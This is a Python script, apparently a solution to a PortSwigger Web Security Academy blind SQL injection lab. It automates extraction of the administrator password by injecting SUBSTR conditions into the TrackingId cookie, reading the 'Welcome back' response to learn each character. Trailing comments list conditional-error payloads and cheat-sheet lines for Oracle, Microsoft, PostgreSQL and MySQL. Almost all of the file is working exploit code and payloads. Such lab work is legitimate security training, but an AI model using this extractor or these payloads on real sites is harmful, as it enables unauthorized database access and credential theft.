import requests

burp0_url = "https://0a1c005804afafcbc0cd726a008a0004.web-security-academy.net:443/filter?category=Gifts"
burp0_cookies = {"TrackingId": "APote5KnCQfDegMa", "session": "WBUniANtlYbYDetaTEjQXoK9fOoi2KZV"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0a1c005804afafcbc0cd726a008a0004.web-security-academy.net/", "Dnt": "1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

# ######################  until here burp paste of request for python  ########################## #
# code by amotz for: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors


char_list = "abcdefghijklmnopqrstuvwxyz1234567890"
trackingId = burp0_cookies["TrackingId"]
loaded_cookies = burp0_cookies
response = requests.get(burp0_url, headers=burp0_headers, cookies=loaded_cookies, proxies={"http": "http://127.0.0.1:8080"})
# print(response.status_code, len(response.content)) #DEBG print

def check_password():
    password = ""
    pass_index = 1
    done = False
    telltale = "Welcome back"
    while not done:
        for char in char_list:
            # print(i) #DEBG print
            payload = f"'+AND+SUBSTR((SELECT+password+FROM+users+WHERE+username+%3d+'administrator'),+{pass_index},+1)+=+'{char}"
            loaded_cookies["TrackingId"] = trackingId + payload
            print(loaded_cookies["TrackingId"]) #DEBG print
            response = requests.get(burp0_url, headers=burp0_headers, cookies=loaded_cookies, proxies={"http": "http://127.0.0.1:8080"})
            # print(response.text) #DEBG print
            if telltale in response.text:
                password += char
                print(f"partial password is {password}")
                pass_index += 1
                break
            elif char == char_list[-1] and password != "":
                done = True
                print(f"DONE! password is ready!\n\npassword for username 'administrator' is:\n{password}\nuse it wisely")
                break
            elif char == char_list[-1] and password =="":
                print(f"sorry but no success pls check ingridiants:{char_list}")
                done = True
                break

if __name__ == '__main__':
    check_password()


# working:
# substr((select password from users where username='administrator'),1,1)='a--+-

# not working:
  # payload = f"'||substr((select password from users where username=administrator),{pass_index},1)='{char}||'"           
            # payload = f"'and substr((select password from users where username='administrator'),1,1)='a --+-"


# materials:

# payload lab before= f"'+AND+SUBSTR((SELECT+password+FROM+users+WHERE+username+%3d+'administrator'),+{pass_index},+1)+=+'{i}"
# oracle:SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual "
# cheetsheet  ' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a

#Microsoft 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
#PostgreSQL 	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)
#MySQL 	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') 

#using to_char:
#TO_CHAR( input_value, [format_mask], [nls_parameter] )

#using substr:
#'and substr((select password from users where username='administrator'),1,1)='a 